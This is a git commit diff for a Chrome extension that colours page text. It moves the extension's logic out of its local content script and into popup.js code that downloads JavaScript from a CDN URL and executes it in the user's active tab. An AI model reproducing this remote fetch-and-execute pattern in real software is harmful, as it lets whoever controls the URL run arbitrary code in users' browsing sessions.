2785da62f4e7ce390a8990534e6d349dd1d27518
Himanshu Kapoor <himanshu@antcrawl.com>
2017-06-27 08:33:35 +0530

    Added fetched code from CDN removed content script from manifest.json updated cdn in popup.js removed unwanted code from content.js

--- assets/js/content.js
+++ assets/js/content.js
@@ -1,24 +1,8 @@
 "use strict"
-// var divs = document.querySelectorAll('div');
-// for(var i = 0;i < divs.length;i++) {
-// 	divs[i].style.color = "red";
-// }
-
 
 chrome.runtime.onMessage.addListener(
-	function(request, sender, sendResponse) {
-	
-		var color = request.color;
-		var tags = request.tags;
-		
-		var k = (request.pattern === "All") ? 1 : 2;
+    function (request, sender, sendResponse) {
 
 
-		for(var i = 0;i < tags.length;i++) {
-			var tag = document.querySelectorAll(tags[i]);
-			for(var j = 0;j < tag.length;j = j + k)
-				tag[j].style.color = color;
-		}	
-
-	}
+    }
 );
--- assets/js/popup.js
+++ assets/js/popup.js
@@ -1,41 +1,60 @@
 (function (d) {
-	"use strict"
-	
-	d.addEventListener('DOMContentLoaded', function () {
-		var modify = d.getElementById('modify');
-		// onClick's logic below:
-		modify.addEventListener('click', function () {
-			var _defaults = {};
-			var color = document.getElementById("color").value || "yellow";
+    "use strict"
 
-			var values = [].filter.call(document.getElementsByName('tags[]'), function(c) {
-				return c.checked;
-			}).map(function(c) {
-				return c.value;
-			});
+    d.addEventListener('DOMContentLoaded', function () {
+        var modify = d.getElementById('modify');
+        // onClick's logic below:
+        modify.addEventListener('click', function () {
+            var _defaults = {};
+            var color = document.getElementById("color").value || "yellow";
 
-			
-
-			_defaults.color = color;
-
-			
-			values.length ? (_defaults.tags = values) : (_defaults.tags = ['p']);
+            var values = [].filter.call(document.getElementsByName('tags[]'), function (c) {
+                return c.checked;
+            }).map(function (c) {
+                return c.value;
+            });
 
 
-			_defaults.pattern = document.getElementById("pattern").value;
-
-			
+            _defaults.color = color;
 
 
-			chrome.extension.sendMessage({ msg: 'modify', defaults : _defaults}, function (response) {
+            values.length ? (_defaults.tags = values) : (_defaults.tags = ['p']);
 
-				chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
 
-					chrome.tabs.sendMessage(tabs[0].id, response, function (response) {
+            _defaults.pattern = document.getElementById("pattern").value;
 
-					});
-				});
-			});
-		});
-	});
+
+            chrome.extension.sendMessage({ msg: 'modify', defaults: _defaults }, function (response) {
+
+
+
+
+                chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
+
+                    var updateTextTo = JSON.stringify(response);
+
+                    chrome.storage.local.set({
+                        'updateTextTo': updateTextTo
+                    }, function () {
+
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("GET", "https://widely.global.ssl.fastly.net/edge/1.0.1/external_code.js", true);
+                        xhr.onreadystatechange = function () {
+                            if (xhr.readyState == 4) {
+
+                                // execute the code
+                                chrome.tabs.executeScript(tabs[0].id, { code: xhr.responseText });
+                            }
+                        }
+                        xhr.send();
+
+                    })
+                });
+
+            });
+
+
+
+        });
+    });
 })(document)
